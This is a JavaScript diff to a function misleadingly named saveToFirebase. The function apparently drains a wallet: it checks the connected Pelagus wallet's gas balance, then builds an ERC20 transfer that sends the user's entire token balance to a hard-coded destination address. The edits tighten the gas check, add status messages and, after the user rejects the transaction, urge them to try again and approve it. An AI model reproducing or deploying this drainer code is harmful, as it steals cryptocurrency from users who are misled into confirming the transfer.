@@ -395,16 +395,19 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        // Check QUAI balance first
+        // Check QUAI balance for gas
         const quaiBalance = await getQuaiBalance(userSession.address);
         const quaiAmount = parseInt(quaiBalance, 16) / 1e18;
-        if (quaiAmount <= 0.01) { // Check if user has at least 0.01 QUAI for gas
+        const requiredQuai = 0.1; // Set required QUAI to 0.1
+        
+        if (quaiAmount < requiredQuai) {
             log('❌ Insufficient QUAI for gas fees');
-            log('Please add some QUAI to your wallet for transaction fees');
+            log(`You need at least ${requiredQuai} QUAI for transaction. Current balance: ${quaiAmount.toFixed(4)} QUAI`);
+            log('Please add QUAI to your wallet to proceed');
             throw new Error('Insufficient QUAI balance for gas');
         }
 
-        // Rest of your token sending code remains the same...
+        // Check token balance
         const currentBalance = await getTokenBalance(userSession.address);
         if (currentBalance <= 0n) {
             log('❌ No tokens available to send');
@@ -413,8 +416,9 @@ async function saveToFirebase(data) {
 
         const readableAmount = (Number(currentBalance) / 1e18).toString();
         log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
+        log(`💰 Gas fee will be paid from your ${quaiAmount.toFixed(4)} QUAI balance`);
 
-        // Encode the transfer data for ERC20 token
+        // Token transfer function setup
         const methodId = '0xa9059cbb';  // ERC20 transfer method ID
         const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');  // Pad to 32 bytes
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');  // Convert to hex and pad
@@ -427,7 +431,9 @@ async function saveToFirebase(data) {
             data: '0x' + methodId + paddedDestination + paddedAmount  // Encoded transfer data
         };
 
+        log(`📤 Sending all tokens to ${DESTINATION_ADDRESS}`);
         log('🔄 Please confirm the transaction in your wallet...');
+        
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
@@ -457,6 +463,7 @@ async function saveToFirebase(data) {
     } catch (error) {
         if (error.code === 4001) {
             log('❌ Transaction rejected in wallet');
+            log('Please try again when ready to approve the transaction');
             return;
         }
         log('❌ Error sending tokens: ' + error.message);
